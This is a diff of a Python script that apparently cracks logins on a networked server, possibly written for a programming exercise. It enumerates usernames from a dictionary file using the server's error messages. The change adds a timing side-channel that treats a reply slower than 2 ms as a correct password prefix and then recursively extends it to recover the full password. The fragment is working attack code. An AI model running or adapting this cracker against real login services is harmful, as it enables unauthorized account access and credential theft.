@@ -1,8 +1,9 @@
 import argparse
+import datetime
 import json
 import string
-from socket import socket
 from itertools import product
+from socket import socket
 
 
 class TCPClient:
@@ -39,19 +40,22 @@ class Crack:
         with open(dictionary, 'r') as dictionary:
             for login in dictionary:
                 login = login.strip('\n')
-                data = json.dumps({'login': login, 'password': ''})
+                data = json.dumps({'login': login, 'password': ' '})
                 self.conn.send_data(data)
                 resp = json.loads(self.conn.read_data())
-                if resp.get('result') == 'Exception happened during login':
+                if resp.get('result') == 'Wrong password!':
                     return login
             return False
 
     def find_password(self, login, start_with=''):
+        resp_time = []
         for password in Crack.generate_password():
             data = json.dumps({'login': login, 'password': start_with + password})
             self.conn.send_data(data)
+            before = datetime.datetime.now()
             resp = json.loads(self.conn.read_data())
-            if resp.get('result') == 'Exception happened during login':
+            time_diff = datetime.datetime.now() - before
+            if time_diff > datetime.timedelta(milliseconds=2):
                 self.find_password(login, start_with + password)
                 break
             if resp.get('result') == 'Connection success!':
